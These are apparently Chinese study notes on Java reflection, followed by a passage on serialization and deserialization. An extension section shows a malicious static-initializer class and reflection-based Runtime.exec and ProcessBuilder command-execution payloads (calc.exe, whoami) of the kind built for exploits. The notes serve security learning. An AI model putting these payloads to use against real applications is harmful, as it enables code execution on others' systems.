# 反射

## 反射概述

概述：

- 反射是指对于任何一个Class类，在"运行的时候"都可以直接得到这个类全部成分。

- 在运行时,可以直接得到这个类的构造器对象：Constructor

- 在运行时,可以直接得到这个类的成员变量对象：Field

- 在运行时,可以直接得到这个类的成员方法对象：Method

- 这种运行时动态获取类信息以及动态调用类中成分的能力称为Java语言的反射机制。

反射的关键：

- 反射的第一步都是先得到编译后的Class类对象，然后就可以得到Class的全部成分


```
HelloWorld.java -> javac -> HelloWorld.class
Class c = HelloWorld.class;
```

问：反射的基本作用、关键？

- 反射是在运行时获取类的字节码文件对象：然后可以解析类中的全部成分。

- 反射的核心思想和关键就是：得到编译以后的class文件对象

## 反射获取类对象

<img src=".\图片\Snipaste_2023-02-19_20-14-36.png" alt="Snipaste_2023-02-19_20-14-36" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-02-19_20-15-5393.png" alt="Snipaste_2023-02-19_20-15-55" style="zoom:80%;" />

获取Class类的对象的三种方式：

- 方式一：Class c1 = Class.forName(“全类名”);

- 方式二：Class c2 =类名.class

- 方式三：Class c3 =对象.getClass();

例子：

```java
package com.zf1yolo.day20.d2_reflect_class;

/**
   目标：反射的第一步：获取Class对象
 */
public class Test {
    public static void main(String[] args) throws Exception {
        // 1、Class类中的一个静态方法：forName(全限名：包名 + 类名)
        Class c = Class.forName("com.zf1yolo.day20.d2_reflect_class.Student");
        System.out.println(c); // Student.class

        // 2、类名.class
        Class c1 = Student.class;
        System.out.println(c1);

        // 3、对象.getClass() 获取对象对应类的Class对象。
        Student s = new Student();
        Class c2 = s.getClass();
        System.out.println(c2);  //class com.zf1yolo.day20.d2_reflect_class.Student
    }
}
```

## 反射获取构造器对象

Class类中用于获取构造器的方法：

| 方法                                                         | 说明                                       |
| ------------------------------------------------------------ | ------------------------------------------ |
| Constructor<?>[]  getConstructors()                          | 返回所有构造器对象的数组（只能拿public的） |
| Constructor<?>[]  getDeclaredConstructors()                  | 返回所有构造器对象的数组，存在就能拿到     |
| Constructor<T>  getConstructor(Class<?>...  parameterTypes)  | 返回单个构造器对象（只能拿public的）       |
| Constructor<T>  getDeclaredConstructor(Class<?>...  parameterTypes) | 返回单个构造器对象，存在就能拿到           |

获取构造器的作用依然是初始化一个对象返回

Constructor类中用于创建对象的方法：

| 符号                                      | 说明                                      |
| ----------------------------------------- | ----------------------------------------- |
| T newInstance(Object...  initargs)        | 根据指定的构造器创建对象                  |
| public  void setAccessible(boolean  flag) | 设置为true,表示取消访问检查，进行暴力反射 |

问：如果是非public的构造器，需要打开权限（暴力反射），然后再创建对象

- setAccessible(boolean)

- 反射可以破坏封装性，私有的也可以执行了

例子：

```java
package com.zf1yolo.day20.d3_reflect_constructor;

public class Student {
    private String name;
    private int age;

    private Student(){
        System.out.println("无参数构造器执行！");
    }

    public Student(String name, int age) {
        System.out.println("有参数构造器执行！");
        this.name = name;
        this.age = age;
    }
// 省略 getter() setter() toString().....
}
```

```java
package com.zf1yolo.day20.d3_reflect_constructor;


import org.junit.Test;

import java.lang.reflect.Constructor;

/**
    目标：反射_获取Constructor构造器对象.

    反射的第一步是先得到Class类对象。（Class文件）

    反射中Class类型获取构造器提供了很多的API:
         1. Constructor getConstructor(Class... parameterTypes)
            根据参数匹配获取某个构造器，只能拿public修饰的构造器，几乎不用！
         2. Constructor getDeclaredConstructor(Class... parameterTypes)
            根据参数匹配获取某个构造器，只要申明就可以定位，不关心权限修饰符，建议使用！
         3. Constructor[] getConstructors()
            获取所有的构造器，只能拿public修饰的构造器。几乎不用！！太弱了！
         4. Constructor[] getDeclaredConstructors()
            获取所有申明的构造器，只要你写我就能拿到，无所谓权限。建议使用！！
    小结：
        获取类的全部构造器对象： Constructor[] getDeclaredConstructors()
            -- 获取所有申明的构造器，只要你写我就能拿到，无所谓权限。建议使用！！
        获取类的某个构造器对象：Constructor getDeclaredConstructor(Class... parameterTypes)
            -- 根据参数匹配获取某个构造器，只要申明就可以定位，不关心权限修饰符，建议使用！

 */
public class TestStudent01 {
    // 1. getConstructors:
    // 获取全部的构造器：只能获取public修饰的构造器。
    // Constructor[] getConstructors()
    @Test
    public void getConstructors(){
        // a.第一步：获取类对象
        Class c = Student.class;
        // b.提取类中的全部的构造器对象(这里只能拿public修饰)
        Constructor[] constructors = c.getConstructors();
        // c.遍历构造器
        for (Constructor constructor : constructors) {
            System.out.println(constructor.getName() + "===>" + constructor.getParameterCount());
            //com.zf1yolo.day20.d3_reflect_constructor.Student===>2
        }
    }


    // 2.getDeclaredConstructors():
    // 获取全部的构造器：只要你敢写，这里就能拿到，无所谓权限是否可及。
    @Test
    public void getDeclaredConstructors(){
        // a.第一步：获取类对象
        Class c = Student.class;
        // b.提取类中的全部的构造器对象
        Constructor[] constructors = c.getDeclaredConstructors();
        // c.遍历构造器
        for (Constructor constructor : constructors) {
            System.out.println(constructor.getName() + "===>" + constructor.getParameterCount());
            //com.zf1yolo.day20.d3_reflect_constructor.Student===>0
            //com.zf1yolo.day20.d3_reflect_constructor.Student===>2
        }
    }

    // 3.getConstructor(Class... parameterTypes)
    // 获取某个构造器：只能拿public修饰的某个构造器
    @Test
    public void getConstructor() throws Exception {
        // a.第一步：获取类对象
        Class c = Student.class;
        // b.定位单个构造器对象 (按照参数定位无参数构造器 只能拿public修饰的某个构造器)
        Constructor cons = c.getConstructor();
        System.out.println(cons.getName() + "===>" + cons.getParameterCount());
    }


    // 4.getConstructor(Class... parameterTypes)
    // 获取某个构造器：只要你敢写，这里就能拿到，无所谓权限是否可及。
    @Test
    public void getDeclaredConstructor() throws Exception {
        // a.第一步：获取类对象
        Class c = Student.class;
        // b.定位单个构造器对象 (按照参数定位无参数构造器)
        Constructor cons = c.getDeclaredConstructor();
        System.out.println(cons.getName() + "===>" + cons.getParameterCount());
        //com.zf1yolo.day20.d3_reflect_constructor.Student===>0

        // c.定位某个有参构造器
        Constructor cons1 = c.getDeclaredConstructor(String.class, int.class);
        System.out.println(cons1.getName() + "===>" + cons1.getParameterCount());
        //com.zf1yolo.day20.d3_reflect_constructor.Student===>2
    }
}
```

## 反射获取成员变量对象

Class类中用于获取成员变量的方法

| 方法                                  | 说明                                         |
| ------------------------------------- | -------------------------------------------- |
| Field[]  getFields()                  | 返回所有成员变量对象的数组（只能拿public的） |
| Field[]  getDeclaredFields()          | 返回所有成员变量对象的数组，存在就能拿到     |
| Field  getField(String  name)         | 返回单个成员变量对象（只能拿public的）       |
| Field  getDeclaredField(String  name) | 返回单个成员变量对象，存在就能拿到           |

获取成员变量的作用依然是在某个对象中取值、赋值

Field类中用于取值**、**赋值的方法：

| 符号                                  | 说明     |
| ------------------------------------- | -------- |
| void  set(Object obj, Object value)： | 赋值     |
| Object  get(Object obj)               | 获取值。 |

注意：如果某成员变量是非public的，需要打开权限（暴力反射），然后再取值、赋值

- `setAccessible(boolean)`

例子：

```java
package com.zf1yolo.day20.d4_reflect_field;

public class Student {
    private String name;
    private int age;
    public static String schoolName;
    public static final String  COUNTTRY = "中国";

    public Student(){
        System.out.println("无参数构造器执行！");
    }

    public Student(String name, int age) {
        System.out.println("有参数构造器执行！");
        this.name = name;
        this.age = age;
    }

// 省略 getter() setter() toString().....
    }
}
```

```java
package com.zf1yolo.day20.d4_reflect_field;

import org.junit.Test;

import java.io.File;
import java.lang.reflect.Field;

/**
     目标：反射_获取Field成员变量对象。

     反射的第一步是先得到Class类对象。

     1、Field getField(String name);
            根据成员变量名获得对应Field对象，只能获得public修饰
     2.Field getDeclaredField(String name);
            根据成员变量名获得对应Field对象，只要申明了就可以得到
     3.Field[] getFields();
            获得所有的成员变量对应的Field对象，只能获得public的
     4.Field[] getDeclaredFields();
            获得所有的成员变量对应的Field对象，只要申明了就可以得到
     小结：
        获取全部成员变量：getDeclaredFields
        获取某个成员变量：getDeclaredField
 */
public class FieldDemo01 {
    /**
     * 1.获取全部的成员变量。
     * Field[] getDeclaredFields();
     *  获得所有的成员变量对应的Field对象，只要申明了就可以得到
     */
    @Test
    public void getDeclaredFields(){
        // a.定位Class对象
        Class c = Student.class;
        // b.定位全部成员变量
        Field[] fields = c.getDeclaredFields();
        // c.遍历一下
        for (Field field : fields) {
            System.out.println(field.getName() + "==>" + field.getType());
        }
    }
    /*name==>class java.lang.String
     age==>int
     schoolName==>class java.lang.String
     COUNTTRY==>class java.lang.String */

    /**
        2.获取某个成员变量对象 Field getDeclaredField(String name);
     */
    @Test
    public void getDeclaredField() throws Exception {
        // a.定位Class对象
        Class c = Student.class;
        // b.根据名称定位某个成员变量
        Field f = c.getDeclaredField("age");
        System.out.println(f.getName() +"===>" + f.getType()); //age===>int
    }

}
```

```java
package com.zf1yolo.day20.d4_reflect_field;

import org.junit.Test;

import java.lang.reflect.Field;

/**
    目标：反射获取成员变量: 取值和赋值。

    Field的方法：给成员变量赋值和取值
        void set(Object obj, Object value)：给对象注入某个成员变量数据
        Object get(Object obj):获取对象的成员变量的值。
        void setAccessible(true);暴力反射，设置为可以直接访问私有类型的属性。
        Class getType(); 获取属性的类型，返回Class对象。
        String getName(); 获取属性的名称。
 */
public class FieldDemo02 {
    @Test
    public void setField() throws Exception {
        // a.反射第一步，获取类对象
        Class c = Student.class;
        // b.提取某个成员变量
        Field ageF = c.getDeclaredField("age");

        ageF.setAccessible(true); // 暴力打开权限

        // c.赋值
        Student s = new Student();
        ageF.set(s , 18);  // s.setAge(18);
        System.out.println(s);  //Student{name='null', age=18}

        // d、取值
        int age = (int) ageF.get(s);
        System.out.println(age);  //18
        
        /*无参数构造器执行！
          Student{name='null', age=18}
          18*/
    }
}
```

## 反射获取方法对象

反射的第一步是先得到类对象，然后从类对象中获取类的成分对象

Class类中用于获取成员方法的方法：

| 方法                                                         | 说明                                         |
| ------------------------------------------------------------ | -------------------------------------------- |
| Method[]  getMethods()                                       | 返回所有成员方法对象的数组（只能拿public的） |
| Method[]  getDeclaredMethods()                               | 返回所有成员方法对象的数组，存在就能拿到     |
| Method  getMethod(String  name, Class<?>... parameterTypes)  | 返回单个成员方法对象（只能拿public的）       |
| Method  getDeclaredMethod(String  name, Class<?>... parameterTypes) | 返回单个成员方法对象，存在就能拿到           |

获取成员方法的作用依然是在某个对象中进行执行此方法

| 符号                                      | 说明                                                         |
| ----------------------------------------- | ------------------------------------------------------------ |
| Object invoke(Object obj, Object... args) | 运行方法  参数一：用obj对象调用该方法  参数二：调用方法的传递的参数（如果没有就不写）  返回值：方法的返回值（如果没有就不写） |

如果某成员方法是非public的，需要打开权限（暴力反射），然后再触发执行

- setAccessible(boolean)

例子：

```java
package com.zf1yolo.day20.d5_reflect_method;

public class Dog {
    private String name ;
    public Dog(){
    }

    public Dog(String name) {
        this.name = name;
    }

    public void run(){
        System.out.println("狗跑的贼快~~");
    }

    private void eat(){
        System.out.println("狗吃骨头");
    }

    private String eat(String name){
        System.out.println("狗吃" + name);
        return "吃的很开心！";
    }

    public static void inAddr(){
        System.out.println("在黑马学习Java!");
    }
// 省略 getter() 与 setter()
}
```

```java
package com.zf1yolo.day20.d5_reflect_method;
import org.junit.Test;

import java.lang.reflect.Method;

/**
    目标：反射——获取Method方法对象

    反射获取类的Method方法对象：
         1、Method getMethod(String name,Class...args);
             根据方法名和参数类型获得对应的方法对象，只能获得public的

         2、Method getDeclaredMethod(String name,Class...args);
             根据方法名和参数类型获得对应的方法对象，包括private的

         3、Method[] getMethods();
             获得类中的所有成员方法对象，返回数组，只能获得public修饰的且包含父类的

         4、Method[] getDeclaredMethods();
            获得类中的所有成员方法对象，返回数组,只获得本类申明的方法。

    Method的方法执行：
        Object invoke(Object obj, Object... args)
          参数一：触发的是哪个对象的方法执行。
          参数二： args：调用方法时传递的实际参数
 */
public class MethodDemo01 {
    /**
     * 1.获得类中的所有成员方法对象
     */
    @Test
    public void getDeclaredMethods(){
        // a.获取类对象
        Class c = Dog.class;
        // b.提取全部方法；包括私有的
        Method[] methods = c.getDeclaredMethods();
        // c.遍历全部方法
        for (Method method : methods) {
            System.out.println(method.getName() +" 返回值类型：" + method.getReturnType() + " 参数个数：" + method.getParameterCount());
        }
    }
    /*
    run 返回值类型：void 参数个数：0
    getName 返回值类型：class java.lang.String 参数个数：0
    setName 返回值类型：void 参数个数：1
    eat 返回值类型：void 参数个数：0
    eat 返回值类型：class java.lang.String 参数个数：1
    inAddr 返回值类型：void 参数个数：0
    * */

    /**
     * 2. 获取某个方法对象
     */
    @Test
    public void getDeclardMethod() throws Exception {
        // a.获取类对象
        Class c = Dog.class;
        // b.提取单个方法对象
        Method m = c.getDeclaredMethod("eat");
        Method m2 = c.getDeclaredMethod("eat", String.class);

        // 暴力打开权限了
        m.setAccessible(true);
        m2.setAccessible(true);

        // c.触发方法的执行
        Dog d = new Dog();
        // 注意：方法如果是没有结果回来的，那么返回的是null.
        Object result = m.invoke(d);
        System.out.println(result);

        Object result2 = m2.invoke(d, "骨头");
        System.out.println(result2);
    }
    /*
    * 狗吃骨头
      null
      狗吃骨头
      吃的很开心！
    * */
}
```

## 反射的作用

### 绕过编译阶段为集合添加数据

反射是作用在运行时的技术，此时集合的**泛型将不能产生约束了**，此时是可以为集合存入其他任意类型的元素

```
ArrayList<Integer> list = new ArrayList<>();
list.add(100);
// list.add(“黑马"); // 报错
list.add(99);
```

泛型只是在**编译阶段可以约束**集合只能操作某种数据类型，在**编译成Class文件进入运行阶段**的时候，其真实类型都是ArrayList了，泛型相当于被擦除了

例子：

```java
package com.zf1yolo.day20.d6_reflect_genericity;

import java.lang.reflect.Method;
import java.util.ArrayList;

public class ReflectDemo {
    public static void main(String[] args) throws Exception {
        // 需求：反射实现泛型擦除后，加入其他类型的元素
        ArrayList<String> lists1 = new ArrayList<>();
        ArrayList<Integer> lists2 = new ArrayList<>();

        System.out.println(lists1.getClass()); //class java.util.ArrayList
        System.out.println(lists2.getClass());  //class java.util.ArrayList

        System.out.println(lists1.getClass() ==  lists2.getClass());  // ArrayList.class  true

        System.out.println("---------------------------");
        ArrayList<Integer> lists3 = new ArrayList<>();
        lists3.add(23);
        lists3.add(22);
        // lists3.add("黑马");

        Class c = lists3.getClass(); // ArrayList.class  ===> public boolean add(E e)
        // 定位c类中的add方法
        Method add = c.getDeclaredMethod("add", Object.class);
        boolean rs = (boolean) add.invoke(lists3, "黑马");
        System.out.println(rs); //true

        System.out.println(lists3); //[23, 22, 黑马]

        ArrayList list4 = lists3;
        System.out.println(lists3==list4); //true
        list4.add("白马");
        list4.add(false);
        System.out.println(lists3);  //[23, 22, 黑马, 白马, false]
    }
}
```

## 反射做通用框架

给你任意一个对象，在不清楚对象字段的情况可以，可以把对象的字段名称和对应值存储到文件中去

例子：

```java
package com.zf1yolo.day20.d7_reflect_framework;

public class Student {
    private String name;
    private char sex;
    private int age;
    private String className;
    private String hobby;
//以下省略一系列常用方法............
}
```

```java
package com.zf1yolo.day20.d7_reflect_framework;

public class Teacher {
    private String name;
    private char sex;
    private double salary;
//以下省略一系列常用方法............
}
```

```java
package com.zf1yolo.day20.d7_reflect_framework;

import java.io.FileOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;

public class MybatisUtil {
    /**
     * 需求
     * 给你任意一个对象，在不清楚对象字段的情况可以，可以把对象的字段名称和对应值存储到文件中去

      保存任意类型的对象
     * @param obj
     */
    public static void save(Object obj){
        try (
                PrintStream ps = new PrintStream(new FileOutputStream("src/main/java/com/zf1yolo/data.txt", true));
        ){
            // 1、提取这个对象的全部成员变量：只有反射可以解决
            Class c = obj.getClass();  //   c.getSimpleName()获取当前类名   c.getName获取全限名：包名+类名
            ps.println("================" + c.getSimpleName() + "================");

            // 2、提取它的全部成员变量
            Field[] fields = c.getDeclaredFields();
            // 3、获取成员变量的信息
            for (Field field : fields) {
                String name = field.getName();
                // 提取本成员变量在obj对象中的值（取值）
                field.setAccessible(true);
                String value = field.get(obj) + "";
                ps.println(name  + "=" + value);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```java
package com.zf1yolo.day20.d7_reflect_framework;

import java.util.Date;
import java.util.Properties;

/**
   目标：提供一个通用框架，支持保存所有对象的具体信息。
 */
public class ReflectDemo {
    public static void main(String[] args) throws Exception {
        Student s = new Student();
        s.setName("猪八戒");
        s.setClassName("西天跑路1班");
        s.setAge(1000);
        s.setHobby("吃，睡");
        s.setSex('男');
        MybatisUtil.save(s);

        Teacher t = new Teacher();
        t.setName("波仔");
        t.setSex('男');
        t.setSalary(6000);
        MybatisUtil.save(t);
    }
}
```

```
data.txt:

================Student================
name=猪八戒
sex=男
age=1000
className=西天跑路1班
hobby=吃，睡
================Teacher================
name=波仔
sex=男
salary=6000.0
```

## 总结

1.反射的作用？

- 可以在运行时得到一个类的全部成分然后操作。
- 可以破坏封装性。（很突出）
- 也可以破坏泛型的约束性。（很突出）
- 更重要的用途是适合：做Java高级框架
- 基本上主流框架都会基于反射设计一些通用技术功能

## 拓展

### forName与类的初始化

forName有两个函数重载： 

```
Class forName(String name) 
Class forName(String name, boolean initialize, ClassLoader loader)
```

 第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：

```
Class.forName(className) 
// 等于 
Class.forName(className, true, currentLoader)
```

**注意，有⼀点很有趣，使⽤功能 `.class` 来创建Class对象的引⽤时，不会⾃动初始化该Class对 象，使⽤`forName()`会⾃动初始化该Class对象**

默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就 是 ClassLoader 。 

ClassLoader 是什么呢？它就是⼀个“加载器”，告诉Java虚拟机如何加载这个类。关于这个点，后⾯还 有很多有趣的漏洞利⽤⽅法，这⾥先不展开说了。Java默认的 ClassLoader 就是根据类名来加载类， **这个类名是类完整路径**，如 `java.lang.Runtime` 。

那么这个初始化究竟指什么呢？ 可以将这个“初始化”理解为类的初始化。我们先来看看如下这个类：

```java
package org.example.p_god;
public class TrainPrint {
    {
        System.out.printf("Empty block initial %s\n", this.getClass());
    }
    static {
        System.out.printf("Static initial %s\n", TrainPrint.class);
    }
    public TrainPrint() {
        System.out.printf("Initial %s\n", this.getClass());
    }
}
```

```java
package org.example.p_god;

public class TrainPrintTest {
    public static void main(String[] args) {
        TrainPrint trainPrint = new TrainPrint();
    }
}
```

```
Static initial class org.example.p_god.TrainPrint
Empty block initial class org.example.p_god.TrainPrint
Initial class org.example.p_god.TrainPrint
```

所以说， forName 中的 `initialize=true` 其实就是告诉Java虚拟机是否执⾏ ”类初始化“ 。

那么，假设我们有如下函数，其中函数的参数name可控：

```java
public void ref(String name) throws Exception { Class.forName(name); }
```

我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：

```java
package org.example.p_god;
import java.lang.Runtime;
import java.lang.Process;
public class Dangerous {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

<img src=".\图片\Snipaste_2023-02-27_16-14-49.png" alt="Snipaste_2023-02-27_16-14-49" style="zoom:67%;" />

#### 类加载机制：

**初始化：执行静态代码块**
**实例化：执行构造代码块，无参构造函数**
动态类加载：Class.forName()
双亲委派

### 反射与命令执行

获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法。

`class.newInstance()` 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是：

1. 你使用的类没有无参构造函数 
2.  你使用的类构造函数是私有的

最最最常见的情况就是 `java.lang.Runtime` ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：

```java
Class clazz = Class.forName("java.lang.Runtime");
clazz.getMethod("exec", String.class).invoke(clazz.newInstance(), "whoami");
```

会得到这样一个错误：

```
java.lang.IllegalAccessException: Class test_p_god.test_01 can not access a member of class java.lang.Runtime with modifiers "private"
```

原因是 Runtime 类的构造方法是私有的

<img src=".\图片\Snipaste_2023-02-27_16-26-43.png" alt="Snipaste_2023-02-27_16-26-43" style="zoom:67%;" />

然鹅 `Runtime` 类就是单例模式，我们使用 `public static Runtime getRuntime()` 方法来创建对象，然后调用 `exec()` 执行命令

```java
Class clazz = Class.forName("java.lang.Runtime");
clazz.getMethod("exec",
        String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz),
        "calc.exe");
```

以上代码等于

```java
Class clazz = Class.forName("java.lang.Runtime");
Method execMethod = clazz.getMethod("exec", String.class);
Method getRuntimeMethod = clazz.getMethod("getRuntime");//获取实例化对象的静态方法
Object runtime = getRuntimeMethod.invoke(clazz);//调用静态方法实例化对象
execMethod.invoke(runtime, "calc.exe");
```

上次讲了个简单的命令执行Payload，但遗留下来两个问题：

- 如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ 

- 如果一个方法或构造方法是私有方法，我们是否能执行它呢？

第一个问题，我们需要用到一个新的反射方法 getConstructor

和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数

获取到构造函数后，我们使用 newInstance 来执行

比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：

```java
Class clazz = Class.forName("java.lang.ProcessBuilder"); 
((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
```

ProcessBuilder有两个构造函数：

- public ProcessBuilder(List command)
- public ProcessBuilder(String... command)

我上面用到了**第一个**形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表 达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步：

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(
Arrays.asList("calc.exe")));
```

通过 getMethod("start") 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了

那么，如果我们要使用**第二个**构造函数 public ProcessBuilder(String... command) 这个构造函数，需要怎样用反 射执行呢？

对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价 的（也就不能重载）：

```java
public void hello(String[] names) {}
public void hello(String...names) {}
```

也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：

```ajva
String[] names = {"hello", "world"};
hello(names);
```

那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。 

所以，我们将字符串数组的类 `String[].class` 传给 getConstructor ，获取 ProcessBuilder 的第二 种构造函数：

```java
Class clazz = Class.forName("java.lang.ProcessBuilder"); 
clazz.getConstructor(String[].class);
```

在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new
String[][]{{"calc.exe"}})).start();
```

有兴趣可以尝试把这个Payload改成完全反射编写。于是编写为：

```java
 Class clazz = Class.forName("java.lang.ProcessBuilder");
        clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(
                new String[][]{{"calc.exe"}}));
```

再说到今天第二个问题，如果一个方法或构造方法是私有方法，我们是否能执行它呢？

这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：

- getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法

- getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了

getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似，我就不再赘述

```java
Class clazz = Class.forName("java.lang.Runtime");
Constructor m = clazz.getDeclaredConstructor();
m.setAccessible(true);
clazz.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe");
```

可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用

# 序列化与反序列化

## 初识

###  1.概念—是什么？

  网上都是这样来描述序列化和反序列化的：

```
序列化（Serialization）：把Java对象转换为字节序列的过程。
反序列化（DeSerialization）：把字节序列恢复为Java对象的过程。
```

  对于Java原生的序列化与反序列化这样描述是没错的，但开发中大多会使用组件来进行序列化和反序列化，比如fastjson,jackson,gson是将Java对象转化为json格式，xstream是将Java对象转化为xml格式。那么，这样对于序列化和反序列化的含义就得有个概括性的总结了：

```
序列化与反序列化其实就是对象与数据格式的转换。序列化是将对象转化为字节序列（二进制序列），Json,xml等数据格式的过程；反序列化就是将对象从字节序列（二进制序列），Json,xml等数据格式中恢复出来的过程。
```

这段描述适用于所有语言的序列化与反序列化

可以用下图来表示：

<img src=".\图片\640" alt="图片" style="zoom:80%;" />

### 2.序列化和反序列化的目的—为什么？

序列化和反序列的设计就是用来方便数据传输的，这些数据可以是文本、图片、音频、视频等。对于Java来说，“万物皆对象”，你要创建文本、图片、音频、视频等就得先new 一个对象出来。当两个Java进程需要进行远程通信，即需要将数据进行网络传输时，该怎么办呢？我们知道，在网络上只能传输二进制流数据，那么此时就要用到序列化与反序列化了。发送方先将要传递的对象进行序列化转换为字节流，接收方收到后进行反序列化这样就可以完成数据传输了。

理解了为什么，我们也就比较容易理解序列化和反序列化的应用场景了：

**1.当需要实现对象的持久化时**

翻译为人话就是将内存中的对象通过序列化的方式存储到文件或者数据库中。这个范围就比较大了，比如当有大量用户进行访问时，可能就会有多个session对象，若这些对象全部驻留在内存，内存可能就会吃不消，这时就会把一些seesion对象先序列化到硬盘中，等需要用的时候，再把保存在硬盘中的对象还原到内存中。

**2.当对象需要进行网络传输时**

**3.当需要通过RMI传递对象时**

RMI即Remote Method Invocation，远程方法调用，是JAVA中一项实现某个java虚拟机像调用本地对象（方法）一样调用另一个java 虚拟机中的对象（方法）的技术。这两个java虚拟机可以在同一台计算机上，也可以不在同一台计算机上。关于RMI会在JNDI篇中详细学习，这里只是留个印象，了解即可。

应用场景可以用freebuf上的这张图来描述：

<img src=".\图片\641" alt="图片" style="zoom:80%;" />

## 实现

### 1.Serializable和Externalizable

**只有实现了 Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列**，否则会抛出异常。Externalizable 接口继承自Serializable接口，实现 Externalizable接口的类完全由自身来控制序列化的行为，而仅实现 Serializable 接口的类可以采用默认的序列化方式。

由于本文学习的是JAVA原生反序列化，故只需了解Serializable接口即可。

Serializable接口有以下特点：

（1）它是Java 提供的序列化接口，是一个空接口，没有成员方法和变量

（2）一个类要想序列化就必须继承java.io.Serializable接口，同时它的子类也可以序列化（不用再继承Serializable接口）

（3）**一个实现Serializable 接口的子类也是可以被序列化的**。在反序列化过程中，它的父类如果没有实现序列化接口，那么父类将需要 提供无参构造函数来重新创建对象，这样做的目的是重新初始化父类的属性，父类对应的属性不会被序列化。

（4**）序列化只能保存对象的非静态成员变量**，不能保存任何的成员方法和静态的成员变量，**而且序列化保存的只是变量的值，对于变量的任何修饰符都不能保存。即序列化是保存对象的状态**（对象属性），序列化针对于对象的属性，而静态成员变量是属于类的

（5）**`transient` 标识的对象成员变量不参与序列化**

（6）Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存

### 2.writeObject()和readObject()

Java.io.ObjectOutputStream 代表对象输出流，它的 `writeObject(Object obj)` 方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中

Java.io.ObjectInputStream代表对象输入流，它的 `readObject()` 方法从一个源输 入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。

### 代码实现

一个 Student 类实现 Serializable 接口

```java
package org.example.d5_serializable;
import java.io.Serializable;

/**
  对象如果要序列化，必须实现Serializable序列化接口。
 */
public class Student implements Serializable {
    // 申明序列化的版本号码
    // 序列化的版本号与反序列化的版本号必须一致才不会出错！
    private static final long serialVersionUID = 1;
    private String name;
    private String loginName;
    // transient修饰的成员变量不参与序列化了
    private transient String passWord;
    private int age ;

    public Student(){
    }

    public Student(String name, String loginName, String passWord, int age) {
        this.name = name;
        this.loginName = loginName;
        this.passWord = passWord;
        this.age = age;
    }
//省略 getter() setter() toString()...
}
```

把对象序列化到文件中

```java
package org.example.d5_serializable;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
/**
     目标：学会对象序列化，使用 ObjectOutputStream 把内存中的对象存入到磁盘文件中。

     transient修饰的成员变量不参与序列化了
     对象如果要序列化，必须实现Serializable序列化接口。

     申明序列化的版本号码
     序列化的版本号与反序列化的版本号必须一致才不会出错！
     private static final long serialVersionUID = 1;
 */
public class ObjectOutputStreamDemo1 {
    public static void main(String[] args) throws Exception {
        // 1、创建学生对象
        Student s = new Student("陈磊", "chenlei","1314520", 21);

        // 2、对象序列化：使用对象字节输出流包装字节输出流管道
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\java_security\\security_01\\src\\main\\java\\org\\example\\d5_serializable\\obj.txt"));
        // 3、直接调用序列化方法
        oos.writeObject(s);

        // 4、释放资源
        oos.close();
        System.out.println("序列化完成了~~");
    }
}
```

把文件中的对象数据 反序列化 成 Student 对象，输出 `Student{name='陈磊', loginName='chenlei', passWord='null', age=21}` ，可见  `private transient String passWord;` 属性没有被序列化，所以反序列化输出时为 `null`

```java
package org.example.d5_serializable;

import java.io.FileInputStream;
import java.io.ObjectInputStream;

/**
    目标：学会进行对象反序列化：使用对象字节输入流把文件中的对象数据恢复成内存中的Java对象。
 */
public class ObjectInputStreamDemo2 {
    public static void main(String[] args) throws Exception {
        // 1、创建对象字节输入流管道包装低级的字节输入流管道
